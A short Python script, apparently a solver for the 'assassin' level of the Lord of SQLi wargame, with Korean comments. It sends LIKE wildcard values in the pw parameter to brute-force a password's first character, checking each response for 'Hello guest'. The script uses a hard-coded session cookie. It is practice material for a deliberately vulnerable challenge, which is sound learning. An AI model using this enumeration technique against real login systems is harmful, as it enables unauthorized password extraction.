import requests
from bs4 import BeautifulSoup

base_url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
cookies = {
    "PHPSESSID": "e7soiqrbe2itte2atgvtbvvm4i"
}
query_params = {
    'pw': ''
}

def fetch_first_character():
    # 첫 번째 문자를 추출하는 방식
    for char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789':
        # LIKE '%a%' 형태로 설정하여 첫 번째 문자 추출
        query_params['pw'] = f"{char}%"  # 작은 따옴표 없이 첫 문자 추출
        response = requests.get(base_url, cookies=cookies, params=query_params)
        soup = BeautifulSoup(response.text, "html.parser")
        
        # 결과 페이지에서 "Hello guest"이 나타나는지 확인
        result = soup.find('h2', string="Hello guest")
        
        if result:
            print(f"첫 번째 문자는: {char}")
            return char
    return None

if __name__ == "__main__":
    first_char = fetch_first_character()
    print(f"추출된 첫 번째 문자: {first_char}")
